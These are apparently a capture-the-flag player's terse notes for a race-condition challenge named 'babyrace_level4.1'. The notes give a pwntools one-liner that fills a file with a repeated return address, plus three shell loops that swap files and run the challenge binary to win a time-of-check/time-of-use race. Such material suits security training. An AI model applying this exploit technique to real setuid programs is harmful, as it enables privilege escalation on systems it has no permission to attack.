# python -c "from pwn import * ; f = open('./b','wb'); f.write(p64(0x4012db)* 0x100) "

# shell 1 : while /bin/true ; do cp b c; done 2>/dev/null
# shell 2 : while /bin/true ; do touch c ; rm c; done 2>/dev/null
# shell 3 : for i in $(seq 1 2000); do nice -n 19 /challenge/babyrace_level4.1 ~/a_end/root/c ; done | tee out